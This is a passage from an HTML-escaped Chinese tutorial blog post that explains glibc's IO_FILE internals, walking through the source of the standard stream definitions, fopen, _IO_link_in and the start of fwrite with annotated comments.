class=&#34;meta&#34;&gt;    = &amp;#123; ._wide_vtable = &amp;amp;_IO_wfile_jumps &amp;#125;; \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;  struct _IO_FILE_plus NAME \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;    = &amp;#123;FILEBUF_LITERAL(CHAIN, FLAGS, FD, &amp;amp;_IO_wide_data_##FD), \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;       &amp;amp;_IO_file_jumps&amp;#125;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;# &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#  &lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; DEF_STDFILE(NAME, FD, CHAIN, FLAGS) \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;  struct _IO_FILE_plus NAME \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;    = &amp;#123;FILEBUF_LITERAL(CHAIN, FLAGS, FD, NULL), \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;       &amp;amp;_IO_file_jumps&amp;#125;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;# &lt;span class=&#34;keyword&#34;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DEF_STDFILE(_IO_2_1_stdin_, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, _IO_NO_WRITES);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DEF_STDFILE(_IO_2_1_stdout_, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &amp;amp;_IO_2_1_stdin_, _IO_NO_READS);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DEF_STDFILE(_IO_2_1_stderr_, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, &amp;amp;_IO_2_1_stdout_, _IO_NO_READS+_IO_UNBUFFERED);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _&lt;span class=&#34;title&#34;&gt;IO_FILE_plus&lt;/span&gt; *_&lt;span class=&#34;title&#34;&gt;IO_list_all&lt;/span&gt; =&lt;/span&gt; &amp;amp;_IO_2_1_stderr_;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_hidden_data_def (_IO_list_all)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		并且存在 3 个全局指针 &lt;code&gt;stdin&lt;/code&gt;，&lt;code&gt;stdout&lt;/code&gt;，&lt;code&gt;stderr&lt;/code&gt; 分别指向 &lt;code&gt;_IO_2_1_stdin_&lt;/code&gt;，&lt;code&gt;_IO_2_1_stdout_&lt;/code&gt;，&lt;code&gt;_IO_2_1_stderr_&lt;/code&gt; 三个结构体。&lt;/p&gt;
&lt;p&gt;stdio.c&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;undef&lt;/span&gt; stdin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;undef&lt;/span&gt; stdout&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;undef&lt;/span&gt; stderr&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_IO_FILE *&lt;span class=&#34;built_in&#34;&gt;stdin&lt;/span&gt; = (FILE *) &amp;amp;_IO_2_1_stdin_;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_IO_FILE *&lt;span class=&#34;built_in&#34;&gt;stdout&lt;/span&gt; = (FILE *) &amp;amp;_IO_2_1_stdout_;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_IO_FILE *&lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt; = (FILE *) &amp;amp;_IO_2_1_stderr_;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;undef&lt;/span&gt; _IO_stdin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;undef&lt;/span&gt; _IO_stdout&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;undef&lt;/span&gt; _IO_stderr&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		于是初始化后的结构如下,可以看到是头插法插入新来的iofile&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-37-IOFILE%E5%88%9D%E6%8E%A2/b71716ff58f043fbec0605f33b934102.png&#34; alt=&#34;b71716ff58f043fbec0605f33b934102&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;fopen&#34;&gt;&lt;a href=&#34;#fopen&#34; class=&#34;headerlink&#34; title=&#34;fopen&#34;&gt;&lt;/a&gt;fopen&lt;/h2&gt;&lt;p&gt;​		fopen在标准IO库中用于打开文件,函数原型如下&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;FILE *&lt;span class=&#34;title function_&#34;&gt;fopen&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *filename, *type)&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;源码分析如下&lt;/p&gt;
&lt;p&gt;include&amp;#x2F;stdio.h&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; IS_IN (libc)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;extern&lt;/span&gt; _IO_FILE *_IO_new_fopen (&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;*, &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;*);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#   &lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; fopen(fname, mode) _IO_new_fopen (fname, mode)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;libio&amp;#x2F;iofopen.c&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;_IO_FILE *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_IO_new_fopen (&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *filename, &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *mode)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; __fopen_internal (filename, mode, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		具体代码分析&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;_IO_FILE *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__fopen_internal (&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *filename, &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *mode, &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; is32)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;locked_FILE&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _&lt;span class=&#34;title&#34;&gt;IO_FILE_plus&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;fp&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;ifdef&lt;/span&gt; _IO_MTSAFE_IO&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_lock_t lock;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _&lt;span class=&#34;title&#34;&gt;IO_wide_data&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;wd&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125; *new_f = (&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; locked_FILE *) &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; locked_FILE)); &lt;span class=&#34;comment&#34;&gt;//调用malloc分配FILE结构的空间,从这里也可以知道FILE结构存储在堆中&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (new_f == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;....&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _IO_JUMPS (&amp;amp;new_f-&amp;gt;fp) = &amp;amp;_IO_file_jumps;&lt;span class=&#34;comment&#34;&gt;//初始化vtable&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _IO_file_init (&amp;amp;new_f-&amp;gt;fp);&lt;span class=&#34;comment&#34;&gt;//调用函数进行进一步初始化操作&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;)&lt;span class=&#34;comment&#34;&gt;//打开目标文件,最后会调用到系统调用open&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; __fopen_maybe_mmap (&amp;amp;new_f-&amp;gt;fp.file);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _IO_un_link (&amp;amp;new_f-&amp;gt;fp);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt; (new_f);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;fileops.c: _IO_file_init&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_IO_new_file_init (&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _IO_FILE_plus *fp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;/* POSIX.1 allows another file handle to be used to change the position&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;     of our file descriptor.  Hence we actually don&amp;#x27;t know the actual&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;     position before we do the first fseek (and until a following fflush). */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fp-&amp;gt;file._offset = _IO_pos_BAD;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fp-&amp;gt;file._IO_file_flags |= CLOSED_FILEBUF_FLAGS;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _IO_link_in (fp);&lt;span class=&#34;comment&#34;&gt;//把新分配的FILE链入_IO_list_all为起始的FILE链表中&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fp-&amp;gt;file._fileno = &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;genops.c  但是这个操作不是会让fp成为头部嘛????????&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_IO_link_in (&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _IO_FILE_plus *fp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ((fp-&amp;gt;file._flags &amp;amp; _IO_LINKED) == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      fp-&amp;gt;file._flags |= _IO_LINKED;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      fp-&amp;gt;file._chain = (_IO_FILE *) _IO_list_all;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      _IO_list_all = fp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      ++_IO_list_all_stamp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&#34;fread&#34;&gt;&lt;a href=&#34;#fread&#34; class=&#34;headerlink&#34; title=&#34;fread&#34;&gt;&lt;/a&gt;fread&lt;/h2&gt;&lt;p&gt;​		可以看下参考链接1给的流程图,结合代码来看&lt;/p&gt;
&lt;p&gt;libio&amp;#x2F;iofread.c&lt;/p&gt;
&lt;h2 id=&#34;fwrite&#34;&gt;&lt;a href=&#34;#fwrite&#34; class=&#34;headerlink&#34; title=&#34;fwrite&#34;&gt;&lt;/a&gt;fwrite&lt;/h2&gt;&lt;p&gt;​		标准IO库函数,用于向文件流中写入数据, 函数原型如下&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;fwrite&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;* buffer, &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; size, &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; count, FILE* stream)&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;ul&gt;
&lt;li&gt;buffer: 是一个指针，对 fwrite 来说，是&lt;strong&gt;需要写入文件的数据的地址&lt;/strong&gt;;&lt;/li&gt;
&lt;li&gt;size: 要写入内容的单字节数;&lt;/li&gt;
&lt;li&gt;count: 要进行写入 size 字节的数据项的个数;&lt;/li&gt;
&lt;li&gt;stream: 目标文件指针;&lt;strong&gt;(要写入的文件)&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;返回值：实际写入的数据项个数 count。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;libio&amp;#x2F;iofwrite.c&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span 